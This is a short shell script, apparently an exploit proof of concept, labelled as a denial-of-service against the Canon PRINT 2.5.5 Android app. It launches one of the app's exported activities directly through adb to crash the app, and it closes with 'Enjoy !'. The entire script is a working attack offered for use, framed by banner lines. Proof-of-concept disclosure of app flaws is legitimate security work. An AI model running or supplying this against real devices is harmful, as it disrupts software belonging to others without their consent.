echo "== Canon PRINT 2.5.5 App Denial-of-Service (DoS) Script =="
echo "[*] Make sure you've done the adb ..."
echo "[+] Launching DoS on Canon PRINT 2.5.5 ..."
adb shell am start -n jp.co.canon.bsd.ad.pixmaprint/jp.co.canon.bsd.ad.pixmaprint.ui.activity.CloudContentListActivity
echo "--> Triggered the App DoS, Enjoy !"